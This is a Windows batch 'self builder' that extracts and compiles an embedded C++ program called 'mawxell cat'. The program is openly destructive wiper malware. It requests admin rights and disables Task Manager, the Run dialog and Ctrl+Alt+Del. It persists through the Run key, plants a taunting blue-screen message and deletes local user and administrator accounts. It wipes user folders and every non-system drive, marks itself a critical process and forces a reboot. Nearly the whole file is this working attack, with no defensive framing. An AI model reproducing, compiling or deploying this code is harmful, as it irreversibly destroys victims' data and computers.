@echo off
title mawxell cat - self builder
color 0C
echo.
echo  ==== mawxell cat builder ====
echo  Extracting source + compiling...
echo.

powershell -NoProfile -ExecutionPolicy Bypass -Command "& {
  $l = Get-Content -LiteralPath '%~f0';
  $s = ($l | Select-String -SimpleMatch '__SOURCE_BEGIN__' | Select-Object -First 1).LineNumber;
  $e = ($l | Select-String -SimpleMatch '__SOURCE_END__' | Select-Object -First 1).LineNumber;
  $l[($s)..($e-2)] | Set-Content -LiteralPath 'mawxell_cat.cpp' -Encoding UTF8;
  $g = @('C:\msys64\ucrt64\bin\g++.exe','C:\msys64\mingw64\bin\g++.exe','C:\mingw64\bin\g++.exe','C:\mingw\bin\g++.exe') | Where-Object { Test-Path $_ } | Select-Object -First 1;
  if (-not $g) { $g = (Get-Command g++.exe -ErrorAction SilentlyContinue).Source };
  if (-not $g) { Write-Host '[ERROR] g++ not found.' -ForegroundColor Red; Write-Host 'Install MSYS2 from https://www.msys2.org then:'; Write-Host '  pacman -S mingw-w64-ucrt-x86_64-gcc'; exit 1 };
  Write-Host ('Compiling with: ' + $g);
  & $g -O2 -s -static -std=c++17 -finput-charset=UTF-8 -fexec-charset=UTF-8 mawxell_cat.cpp -o mawxell_cat.exe -luser32 -lshell32 -ladvapi32;
  if (Test-Path 'mawxell_cat.exe') { Write-Host ''; Write-Host '[OK] mawxell_cat.exe created right next to this file.' -ForegroundColor Green; Get-Item 'mawxell_cat.exe' | Select-Object Name,Length,LastWriteTime } else { Write-Host '[ERROR] build failed - paste the output above.' -ForegroundColor Red }
}"
echo.
pause
exit /b
__SOURCE_BEGIN__
#include <windows.h>
#include <shellapi.h>
#include <cwchar>
#include <cstdio>
#include <string>
#include <iostream>

typedef LONG NTSTATUS;
typedef NTSTATUS(NTAPI* pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);

static void SetRed() {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),
                            FOREGROUND_RED | FOREGROUND_INTENSITY);
}

static BOOL EnablePrivilege(LPCSTR name) {
    HANDLE hTok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
        return FALSE;

    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!LookupPrivilegeValueA(NULL, name, &tp.Privileges[0].Luid)) {
        CloseHandle(hTok);
        return FALSE;
    }

    BOOL ok = AdjustTokenPrivileges(hTok, FALSE, &tp, 0, NULL, NULL);
    CloseHandle(hTok);
    return ok;
}

static void TriggerReboot() {
    if (!EnablePrivilege("SeShutdownPrivilege")) {
        std::cerr << "Failed to enable privilege\n";
        return;
    }

    if (!ExitWindowsEx(EWX_REBOOT, 0)) {
        std::cerr << "ExitWindowsEx failed: " << GetLastError() << "\n";
    }
}
static void ArmCritical() {
    EnablePrivilege("SeDebugPrivilege");
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    pRtlSetProcessIsCritical RtlSet =
        (pRtlSetProcessIsCritical)GetProcAddress(ntdll, "RtlSetProcessIsCritical");
    if (RtlSet) RtlSet(TRUE, NULL, FALSE);
    pNtSetInformationProcess NtSet =
        (pNtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
    if (NtSet) {
        ULONG breakOn = 1;
        NtSet(GetCurrentProcess(), 29, &breakOn, sizeof(ULONG));
    }
}

static void TriggerBSODAndReboot() {
    TerminateProcess(GetCurrentProcess(), 0);
    EnablePrivilege("SeShutdownPrivilege");
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE | EWX_FORCEIFHUNG, SHTDN_REASON_MAJOR_OTHER);
}

static void CrashText() {
    HKEY hk = NULL;
    RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\CrashControl",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL);
    if (hk) {
        const wchar_t* msg =
            L"Yo You Got Hacked Pc And File all Haha (\x412\x430\x43C \x43F\x43E\x442\x440\x456\x431\x43D\x43E \x43F\x43E\x43B\x430\x433\x43E\x434\x438\x442\x438 \x41F\x41A)";
        RegSetValueExW(hk, L"DisplayMessage", 0, REG_SZ,
                       (const BYTE*)msg, (DWORD)((wcslen(msg) + 1) * 2));
        const wchar_t* par = L"mawxell cat";
        RegSetValueExW(hk, L"DisplayParameters", 0, REG_SZ,
                       (const BYTE*)par, (DWORD)((wcslen(par) + 1) * 2));
        RegCloseKey(hk);
    }
}

static void RegistryPolicies() {
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f");
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f");
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableCAD /t REG_DWORD /d 1 /f");
    char exe[MAX_PATH];
    GetModuleFileNameA(NULL, exe, MAX_PATH);
    std::string run = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v mawxell_cat /t REG_SZ /d \"";
    run += exe;
    run += "\" /f";
    system(run.c_str());
}

static void DeleteAll() {
    const char* ps =
        "Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue;"
        "Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer' "
        "NukeOnDelete 1 -Type DWord;"
        "net user Administrator /active:no | Out-Null;"
        "net user Administrator /delete 2>$null | Out-Null;"
        "Get-LocalUser | Where-Object {$_.Name -ne $env:USERNAME} | "
        "ForEach-Object { Remove-LocalUser -Name $_.Name -Force -ErrorAction SilentlyContinue };"
        "net localgroup Administrators | Select-Object -Skip 6 | "
        "Where-Object {$_ -and $_ -notmatch '^The|^$'} | ForEach-Object { "
        "net localgroup Administrators $_ /delete 2>$null | Out-Null };"
        "Remove-Item C:\\Users\\* -Recurse -Force -ErrorAction SilentlyContinue;"
        "Remove-Item 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\*' "
        "-Recurse -Force -ErrorAction SilentlyContinue;"
        "Get-ChildItem $env:USERPROFILE -Recurse -Force -EA SilentlyContinue | "
        "Remove-Item -Recurse -Force -EA SilentlyContinue;"
        "Get-PSDrive -PSProvider FileSystem | ? {$_.Name -ne 'C'} | % { "
        "Get-ChildItem $_.Root -Recurse -Force -EA SilentlyContinue | "
        "Remove-Item -Recurse -Force -EA SilentlyContinue }";
    std::string cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"";
    cmd += ps;
    cmd += "\"";
    system(cmd.c_str());
}

int main() {
    if (!IsUserAnAdmin()) {
        char exe[MAX_PATH];
        GetModuleFileNameA(NULL, exe, MAX_PATH);
        ShellExecuteA(NULL, "runas", exe, NULL, NULL, SW_SHOW);
        return 0;
    }

    SetConsoleTitleA("mawxell cat");
    system("color 0C");
    SetRed();

    std::cout << "\n  ============ mawxell cat ============\n";
    RegistryPolicies();
    std::cout << "  [1/5] Win+R kill ................. OK\n";
    CrashText();
    std::cout << "  [2/5] Task Manager / CAD kill .... OK\n";
    std::cout << "  [3/5] BSOD message planted ....... OK\n";
    std::cout << "  [4/5] Deleting ALL files + Administrator ... running...\n";
    DeleteAll();
    std::cout << "  [4/5] Deletion DONE\n";
    std::cout << "  [5/5] Arming critical process .... OK\n";
    ArmCritical();

    for (int i = 60; i > 0; --i) {
        std::cout << "\r  >>> BSOD + REBOOT in " << i << " seconds ... " << std::flush;
        Sleep(1000);
    }
    std::cout << "\r  >>> BOOM. Say goodbye.                        \n\n";
    Sleep(500);

system("shutdown /r /t 0");

TriggerReboot();
return 0;    
    TriggerBSODAndReboot();
    return 0;
}
__SOURCE_END__
